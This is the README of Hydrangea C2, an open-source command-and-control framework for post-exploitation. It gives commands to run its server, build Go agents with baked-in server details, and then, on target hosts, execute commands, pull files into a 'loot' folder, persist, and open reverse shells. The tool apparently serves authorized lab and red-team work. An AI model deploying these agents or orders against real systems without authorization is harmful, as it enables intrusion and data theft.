# Hydrangea C2

```
   ▄█    █▄    ▄██   ▄   ████████▄     ▄████████    ▄████████ ███▄▄▄▄      ▄██████▄     ▄████████    ▄████████
  ███    ███   ███   ██▄ ███   ▀███   ███    ███   ███    ███ ███▀▀▀██▄   ███    ███   ███    ███   ███    ███
  ███    ███   ███▄▄▄███ ███    ███   ███    ███   ███    ███ ███   ███   ███    █▀    ███    █▀    ███    ███
 ▄███▄▄▄▄███▄▄ ▀▀▀▀▀▀███ ███    ███  ▄███▄▄▄▄██▀   ███    ███ ███   ███  ▄███         ▄███▄▄▄       ███    ███
▀▀███▀▀▀▀███▀  ▄██   ███ ███    ███ ▀▀███▀▀▀▀▀   ▀███████████ ███   ███ ▀▀███ ████▄  ▀▀███▀▀▀     ▀███████████
  ███    ███   ███   ███ ███    ███ ▀███████████   ███    ███ ███   ███   ███    ███   ███    █▄    ███    ███
  ███    ███   ███   ███ ███   ▄███   ███    ███   ███    ███ ███   ███   ███    ███   ███    ███   ███    ███
  ███    █▀     ▀█████▀  ████████▀    ███    ███   ███    █▀   ▀█   █▀    ████████▀    ██████████   ███    █▀
                                      ███    ███

              Hydrangea C2 •  V3.2
```

Hydrangea is a modular command-and-control (C2) framework designed for simple and reliable post-exploitation fleet management. It features a Python-based server and controller, plus a Go client agent, enabling efficient management of multiple endpoints over TCP. Hydrangea supports **file transfers**, **remote command execution**, **reverse shell management**, **port forwarding**, and more, all with a focus on clarity, minimalism, and explicit control. Intended for trusted environments, it emphasizes ease of use, extensibility, and security best practices.

---

For detailed documentation please consider reading the [Wiki](https://github.com/tristanqtn/Hydrangea-C2/wiki).

---

## Table of Contents

- [Overview](#overview)
- [Disclaimer](#disclaimer)
- [Architecture](#architecture)
- [Install & Run](#install--run)
- [TLS](#tls)
- [Orders & Methods](#orders--methods)
- [Storage & Paths](#storage--paths)

---

## Overview

### Back Story

Hydrangea was born out of necessity. While working through certifications, CTFs, and personal research, I needed a straightforward way to manage a small fleet during post-exploitation phases, without wrestling bulky, over-engineered C2s. I wanted something simple, agile, and explicit: clear orders in, clear results out. So I built it. Hydrangea keeps the surface area small and the workflow calm, designed for authorized lab and internal environments where reliability and readability matter more than bells and whistles. Sometimes the easiest way is to make it yourself.

### Structure

Hydrangea C2 has three parts:

- **Server** (`server/server.py`) — listens on one or more TCP ports, tracks connected clients, relays orders, stores incoming files.
- **Controller** (`server/ctl.py`) — interactive REPL with arrow-key history, tab completion, and a Rich-powered UI.
- **Client** (`client/go/`) — Go agent that registers to the server and executes orders (list, file transfer, exec, session info, reverse shell, port forward).

> Use on **trusted networks/hosts** with explicit authorization only.

---

## Disclaimer

> [!CAUTION]
> Hydrangea C2 is provided **solely for lawful, authorized use** — such as lab work, education, internal administration, and environments where you **own or have explicit permission** to manage the systems involved. Using this software to access, monitor, or modify computers **without consent** may violate laws and regulations. **You are responsible** for complying with all applicable laws, policies, and contractual obligations. The authors and distributors **do not accept liability** for misuse, damage, loss of data, or any consequences arising from the use of this software. Use responsibly.

---

## Architecture

```
[ Controller ]  ── ADMIN RPC ──▶  [ Server ]  ══ orders ══▶  [ Client(s) ]
                                              ◀══ results ══
```

- Transport: custom **length-prefixed binary frame** — 4-byte big-endian header length → UTF-8 JSON header → optional binary payload.
- The server accepts both admin (controller) and agent connections on the same ports, distinguished by the initial handshake type.
- Async responses (`list --wait`, `exec`, `session`) are correlated with a `req_id` UUID so multiple in-flight requests can coexist.
- Keepalive: server PINGs every 30 s, evicts agents silent for 90 s.

---

## Install & Run

### Prerequisites

| Component | Requirement |
|---|---|
| Server & Controller | Python **3.10+**, [Poetry](https://python-poetry.org/) |
| Go agent (build) | Go **1.21+** |
| Go agent (cross-compile) | [Nix](https://nixos.org/) |
| TLS auto-cert | `openssl` in `PATH` |

### 1 — Install Python dependencies

```bash
# From the project root
poetry install
```

This installs the `hydrangea` package and its dependencies (`rich`, `prompt_toolkit`) into an isolated virtualenv. The `ruff` linter is installed in the dev group only.

### 2 — Start the server

```bash
# Plain TCP, single port
poetry run hydrangea-server --ports 9000 --auth-token supersecret

# Multiple ports
poetry run hydrangea-server --ports 9000 9001 --storage ./loot --auth-token supersecret

# With TLS (auto-generates a self-signed cert via openssl)
poetry run hydrangea-server --ports 9000 --auth-token supersecret --tls-auto

# With your own cert/key
poetry run hydrangea-server --ports 9000 --auth-token supersecret \
  --tls-cert server.crt --tls-key server.key
```

The server prints a SHA-256 fingerprint when TLS is enabled — copy it for use with the controller and agents.

### 3 — Start the controller

```bash
# Connect to a local server
poetry run hydrangea-ctl --port 9000 --auth-token supersecret

# Connect to a remote server
poetry run hydrangea-ctl --host 10.0.0.1 --port 9000 --auth-token supersecret

# With TLS + fingerprint pinning
poetry run hydrangea-ctl --port 9000 --auth-token supersecret \
  --tls --tls-fingerprint <hex-from-server>

# Auto-start a server and then open the REPL
poetry run hydrangea-ctl --port 9000 --auth-token supersecret --start-srv

# UI flags
poetry run hydrangea-ctl --port 9000 --auth-token supersecret --no-banner --no-color
```

The controller validates connectivity and token before entering the REPL. Once inside:

- **↑ / ↓** — browse command history (persisted in `~/.hydrangea_history`)
- **Tab** — complete command names
- **Ctrl+R** — reverse history search
- **exit / quit / Ctrl+D** — prompts for confirmation before closing

### 4 — Build and deploy a Go agent

**From the controller REPL:**

```
hydrangea ❯  build-client --server-host 10.0.0.1 --server-port 9000 \
               --build-auth-token supersecret --client-id target-1 --out ./agents

# With TLS baked in
hydrangea ❯  build-client --server-host 10.0.0.1 --server-port 9000 \
               --build-auth-token supersecret --build-tls \
               --build-tls-fingerprint <hex> --out ./agents
```

**Or manually:**

```bash
cd client/go

# Plain build
go build -o hydrangea-agent .

# With baked-in defaults
go build \
  -ldflags "-X main.DefaultServerHost=10.0.0.1 \
            -X main.DefaultServerPort=9000 \
            -X main.DefaultAuthToken=supersecret \
            -X main.DefaultClientID=target-1" \
  -o hydrangea-agent .

# Cross-compile via Nix
nix build ".#hydrangea-client-linux"
nix build ".#hydrangea-client-windows"
```

**Run the agent on the target:**

```bash
./hydrangea-agent --server 10.0.0.1 --port 9000 --auth-token supersecret --client-id target-1

# With TLS (fingerprint pins the self-signed cert)
./hydrangea-agent --server 10.0.0.1 --port 9000 --auth-token supersecret \
  --tls --tls-fingerprint <hex>

# Additional flags
./hydrangea-agent ... [--persist] [--debug] [--device-info] [--test-connection]
```

> The **auth token** must match across server, controller, and all agents.

---

## TLS

All three components support TLS with optional certificate pinning.

| Flag | Where | Effect |
|---|---|---|
| `--tls-auto` | server | Generate a self-signed cert via `openssl` |
| `--tls-cert` / `--tls-key` | server | Use your own certificate |
| `--tls` | controller, agent | Enable TLS on the connection |
| `--tls-fingerprint <hex>` | controller, agent | Pin the server's leaf-cert SHA-256 (implies `--tls`) |

Without `--tls-fingerprint`, TLS is still used but the certificate is not verified — suitable for quick testing with self-signed certs. With the fingerprint, the connection is aborted if the cert doesn't match.

The server prints the fingerprint at startup when TLS is enabled. Copy-paste it directly into `--tls-fingerprint` or `--build-tls-fingerprint`.

---

## Orders & Methods

Hydrangea exposes a small, explicit surface. Anything not listed here isn't implemented.

### Context

| Command | Description |
|---|---|
| `use <id>` | Set the active client — subsequent commands target it without `--client` |
| `unuse` | Clear the active client |

### Client

| Command | Description |
|---|---|
| `clients` | List all connected agent IDs |
| `ping [--client <id>]` | Send a ping (fire and forget) |
| `session [--client <id>]` | Fetch OS, user, PID, cwd, and runtime info |

### Files

| Command | Description |
|---|---|
| `list [--client <id>] [--path <p>] [--wait] [--timeout <s>]` | List a directory on the agent. `--wait` blocks and renders the result; without it the order is queued and logged server-side. |
| `pull [--client <id>] --src <agent_path> --dest <server_path>` | Pull a file from the agent to the server. Relative `--dest` lands under `server_storage/<client_id>/`; absolute paths are written exactly there. |
| `push [--client <id>] --src <local_path> --dest <agent_path>` | Push a local file to the agent. |

### Execution

| Command | Description |
|---|---|
| `exec [--client <id>] --command "<cmd>" [--shell] [--cwd <p>] [--timeout <s>]` | Run a command on the agent; returns `rc`, `stdout`, and `stderr`. Pass a JSON list for argv (`["ls","-la"]`) or a plain string. |
| `local <cmd>` | Run a command locally on the controller machine (5-minute timeout). |

### Advanced

| Command | Description |
|---|---|
| `reverse-shell [--client <id>] <host:port>` | Tell the agent to connect back with a shell. Start your listener **before** issuing this command. |
| `port-forward [--client <id>] --ligolo-path <bin> --connect-args "<args>"` | Upload and launch a Ligolo agent for port forwarding. |

### Build & Server

| Command | Description |
|---|---|
| `build-client [options]` | Compile Go agents with baked-in server details. See [Build and deploy a Go agent](#4--build-and-deploy-a-go-agent). |
| `server-status` | Show server health and recent log entries. |

---

## Storage & Paths

**Server side**
- Pulled files land in `server_storage/<client_id>/` by default.
- An absolute `--dest` (e.g. `/tmp/out.bin`) is written exactly at that path on the server host.

**Agent side (Go)**
- Absolute paths on the agent are allowed and resolve as-is (full filesystem access).
- Relative paths resolve against the agent's `--root` base directory.
- Parent directories are created automatically on `push`.

---

## Development

```bash
# Lint
poetry run ruff check server/

# Format
poetry run ruff format server/

# Check types / imports after changes
poetry run ruff check --select I server/
```
